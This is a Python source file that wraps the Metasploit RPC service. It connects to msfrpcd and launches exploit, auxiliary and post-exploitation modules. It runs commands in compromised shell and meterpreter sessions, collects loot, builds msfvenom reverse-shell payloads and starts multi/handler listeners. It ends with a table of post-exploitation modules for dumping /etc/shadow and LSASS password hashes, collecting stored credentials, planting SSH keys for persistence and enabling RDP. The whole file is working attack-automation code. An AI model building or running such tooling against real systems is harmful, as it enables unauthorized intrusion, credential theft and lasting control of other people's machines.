"""
Metasploit RPC client wrapper.
Connects to msfrpcd via pymetasploit3.
All methods return None / empty gracefully if MSF is not available.
"""

import logging
from typing import Optional
import re

logger = logging.getLogger(__name__)

_client = None
_connected = False


def get_client():
    global _client, _connected
    return _client if _connected else None


def connect(host: str = "127.0.0.1", port: int = 55553, password: str = "", ssl: bool = False) -> bool:
    import os
    password = password or os.getenv("MSF_RPC_PASSWORD", "")
    global _client, _connected
    try:
        from pymetasploit3.msfrpc import MsfRpcClient
        _client = MsfRpcClient(password, server=host, port=port, ssl=ssl)
        _connected = True
        logger.info(f"Connected to Metasploit RPC at {host}:{port}")
        return True
    except Exception as e:
        logger.warning(f"Could not connect to Metasploit RPC: {e}")
        _connected = False
        _client = None
        return False


def disconnect():
    global _client, _connected
    _client = None
    _connected = False


def get_status() -> dict:
    client = get_client()
    if not client:
        return {"connected": False, "version": None, "sessions": 0, "jobs": 0}
    try:
        version = client.core.version()
        sessions = len(client.sessions.list)
        jobs = len(client.jobs.list)
        return {
            "connected": True,
            "version": version.get("version", "unknown"),
            "ruby_version": version.get("ruby", "unknown"),
            "sessions": sessions,
            "jobs": jobs,
        }
    except Exception as e:
        logger.warning(f"MSF status error: {e}")
        return {"connected": False, "version": None, "sessions": 0, "jobs": 0}


def list_sessions() -> list[dict]:
    client = get_client()
    if not client:
        return []
    try:
        sessions = client.sessions.list
        result = []
        for sid, info in sessions.items():
            result.append({
                "msf_session_id": str(sid),
                "session_type": info.get("type", "shell"),
                "tunnel_peer": info.get("tunnel_peer", ""),
                "tunnel_local": info.get("tunnel_local", ""),
                "via_exploit": info.get("via_exploit", ""),
                "via_payload": info.get("via_payload", ""),
                "arch": info.get("arch", ""),
                "platform": info.get("platform", ""),
                "remote_host": info.get("tunnel_peer", "").split(":")[0] if ":" in info.get("tunnel_peer", "") else info.get("tunnel_peer", ""),
                "remote_port": info.get("tunnel_peer", "").split(":")[1] if ":" in info.get("tunnel_peer", "") else "",
                "info": info.get("info", ""),
            })
        return result
    except Exception as e:
        logger.warning(f"MSF list_sessions error: {e}")
        return []


def list_jobs() -> list[dict]:
    client = get_client()
    if not client:
        return []
    try:
        jobs = client.jobs.list
        result = []
        for jid, info in jobs.items():
            result.append({
                "job_id": str(jid),
                "name": info.get("name", ""),
                "started_at": info.get("started_at", ""),
                "datastore": info.get("datastore", {}),
            })
        return result
    except Exception as e:
        logger.warning(f"MSF list_jobs error: {e}")
        return []


def stop_job(job_id: str) -> bool:
    client = get_client()
    if not client:
        return False
    try:
        client.jobs.stop(job_id)
        return True
    except Exception as e:
        logger.warning(f"MSF stop_job error: {e}")
        return False


def run_module(module_type: str, module_name: str, options: dict) -> dict:
    """Run a MSF module (exploit, auxiliary, post) and return job/result info."""
    client = get_client()
    if not client:
        return {"error": "Not connected to Metasploit"}
    try:
        if module_type == "exploit":
            mod = client.modules.use("exploit", module_name)
        elif module_type == "auxiliary":
            mod = client.modules.use("auxiliary", module_name)
        elif module_type == "post":
            mod = client.modules.use("post", module_name)
        else:
            return {"error": f"Unknown module type: {module_type}"}

        for key, val in options.items():
            mod[key] = val

        result = mod.execute()
        return {"result": result}
    except Exception as e:
        logger.warning(f"MSF run_module error: {e}")
        return {"error": str(e)}


def session_run_command(msf_session_id: str, command: str, timeout: int = 30) -> str:
    """Run a command in a shell/meterpreter session and return output."""
    client = get_client()
    if not client:
        return "[Error] Not connected to Metasploit"

    # Validate command — no shell injection beyond what MSF handles natively
    command = command.strip()
    if not command:
        return ""

    try:
        session = client.sessions.session(msf_session_id)
        if hasattr(session, 'run_with_output'):
            # Meterpreter session
            output = session.run_with_output(command, timeout=timeout)
        else:
            # Shell session
            session.write(command + "\n")
            import time
            time.sleep(2)
            output = session.read()
        return output or ""
    except Exception as e:
        logger.warning(f"MSF session_run_command error: {e}")
        return f"[Error] {e}"


def kill_session(msf_session_id: str) -> bool:
    client = get_client()
    if not client:
        return False
    try:
        client.sessions.session(msf_session_id).stop()
        return True
    except Exception as e:
        logger.warning(f"MSF kill_session error: {e}")
        return False


def get_loot(msf_session_id: str = None) -> list[dict]:
    """Pull loot from Metasploit DB."""
    client = get_client()
    if not client:
        return []
    try:
        # MSF loot via db.loots RPC call
        loot = client.call("db.loots", [{}])
        if isinstance(loot, dict) and "loots" in loot:
            items = []
            for l in loot["loots"]:
                items.append({
                    "loot_type": l.get("ltype", "unknown"),
                    "name": l.get("name", ""),
                    "content_type": l.get("content_type", ""),
                    "path": l.get("path", ""),
                    "data": l.get("data", ""),
                    "host": l.get("host", ""),
                    "service": l.get("service_id", ""),
                    "info": l.get("info", ""),
                    "created_at": str(l.get("created_at", "")),
                })
            return items
        return []
    except Exception as e:
        logger.warning(f"MSF get_loot error: {e}")
        return []


def generate_payload(
    payload: str,
    lhost: str,
    lport: int,
    fmt: str = "elf",
    arch: str = "x86_64",
    platform: str = "linux",
    extra_opts: dict = None,
) -> bytes | None:
    """
    Generate a payload using msfvenom via subprocess.
    Returns raw bytes of the payload, or None on error.
    Uses subprocess with a fixed argument list — no shell=True.
    """
    import subprocess
    import shutil
    import re

    if not shutil.which("msfvenom"):
        return None

    # Validate inputs strictly
    if not re.match(r'^[\w/]+$', payload):
        raise ValueError("Invalid payload name")
    if not re.match(r'^[\w\.\-]+$', lhost):
        raise ValueError("Invalid LHOST")
    if not (1 <= lport <= 65535):
        raise ValueError("Invalid LPORT")
    allowed_formats = {"elf", "exe", "raw", "python", "bash", "php", "asp", "aspx", "jar", "psh", "macho", "dll", "apk"}
    if fmt not in allowed_formats:
        raise ValueError(f"Invalid format: {fmt}")
    allowed_arches = {"x86", "x86_64", "x64", "arm", "aarch64", "mipsle", "mipsbe"}
    if arch not in allowed_arches:
        raise ValueError(f"Invalid arch: {arch}")

    cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={str(lport)}",
        "-f", fmt,
        "-a", arch,
        "--platform", platform,
    ]

    if extra_opts:
        for k, v in extra_opts.items():
            if re.match(r'^\w+$', str(k)) and re.match(r'^[\w\.\-:/]+$', str(v)):
                cmd.append(f"{k}={v}")

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            timeout=60,
        )
        if result.returncode == 0:
            return result.stdout
        logger.warning(f"msfvenom error: {result.stderr.decode()}")
        return None
    except Exception as e:
        logger.warning(f"msfvenom subprocess error: {e}")
        return None


def start_listener(payload: str, lhost: str, lport: int, extra_opts: dict = None) -> dict:
    """Start a multi/handler listener for the given payload."""
    client = get_client()
    if not client:
        return {"error": "Not connected to Metasploit"}

    # Validate
    import re
    if not re.match(r'^[\w/]+$', payload):
        return {"error": "Invalid payload"}
    if not re.match(r'^[\w\.\-]+$', lhost):
        return {"error": "Invalid LHOST"}
    if not (1 <= lport <= 65535):
        return {"error": "Invalid LPORT"}

    try:
        exploit = client.modules.use("exploit", "multi/handler")
        exploit["PAYLOAD"] = payload
        exploit["LHOST"] = lhost
        exploit["LPORT"] = lport
        if extra_opts:
            for k, v in (extra_opts or {}).items():
                if re.match(r'^\w+$', str(k)):
                    exploit[k] = v
        result = exploit.execute(payload=payload)
        return {"result": result, "job_id": result.get("job_id")}
    except Exception as e:
        logger.warning(f"MSF start_listener error: {e}")
        return {"error": str(e)}


# Common post-exploitation modules
POST_MODULES = {
    "linux": [
        {"name": "post/multi/recon/local_exploit_suggester", "label": "Local Exploit Suggester", "description": "Find local privilege escalation exploits"},
        {"name": "post/linux/gather/hashdump", "label": "Hash Dump", "description": "Dump /etc/shadow hashes"},
        {"name": "post/linux/gather/enum_system", "label": "System Enumeration", "description": "Enumerate system info, users, services"},
        {"name": "post/linux/gather/enum_network", "label": "Network Enumeration", "description": "Enumerate network interfaces and connections"},
        {"name": "post/linux/manage/sshkey_persistence", "label": "SSH Key Persistence", "description": "Add SSH key for persistence"},
        {"name": "post/multi/gather/env", "label": "Environment Variables", "description": "Dump environment variables"},
    ],
    "windows": [
        {"name": "post/multi/recon/local_exploit_suggester", "label": "Local Exploit Suggester", "description": "Find local privilege escalation exploits"},
        {"name": "post/windows/gather/hashdump", "label": "Hash Dump (LSASS)", "description": "Dump NTLM hashes from LSASS"},
        {"name": "post/windows/gather/credentials/credential_collector", "label": "Credential Collector", "description": "Collect stored credentials"},
        {"name": "post/windows/gather/enum_system", "label": "System Enumeration", "description": "Enumerate system info and config"},
        {"name": "post/windows/manage/enable_rdp", "label": "Enable RDP", "description": "Enable Remote Desktop Protocol"},
        {"name": "post/windows/gather/enum_logged_on_users", "label": "Logged On Users", "description": "List currently logged on users"},
        {"name": "post/multi/manage/shell_to_meterpreter", "label": "Shell → Meterpreter", "description": "Upgrade shell to Meterpreter"},
    ],
    "multi": [
        {"name": "post/multi/manage/shell_to_meterpreter", "label": "Shell → Meterpreter", "description": "Upgrade shell session to Meterpreter"},
        {"name": "post/multi/gather/env", "label": "Environment Variables", "description": "Dump environment variables"},
        {"name": "post/multi/recon/local_exploit_suggester", "label": "Local Exploit Suggester", "description": "Suggest local privilege escalation exploits"},
    ],
}
